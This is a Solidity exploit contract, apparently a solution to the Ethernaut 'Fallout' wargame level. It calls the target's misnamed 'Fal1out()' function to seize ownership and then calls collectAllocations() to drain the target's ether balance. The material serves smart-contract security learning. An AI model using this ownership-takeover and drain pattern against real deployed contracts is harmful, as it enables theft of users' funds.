pragma solidity ^0.8.11;

import "./Fallout.sol";

contract FalloutAttack {
    Fallout private _victim;

    constructor(address payable victim) {
        _victim = Fallout(victim);
    }

    function attack() external payable returns (uint256 balance) {
        (bool success, ) = address(_victim).call{value: msg.value}(
            abi.encodeWithSignature("Fal1out()")
        );

        if (success) {
            _victim.collectAllocations();
        }

        balance = address(this).balance;
    }

    receive() external payable {
        //receive function
    }
}
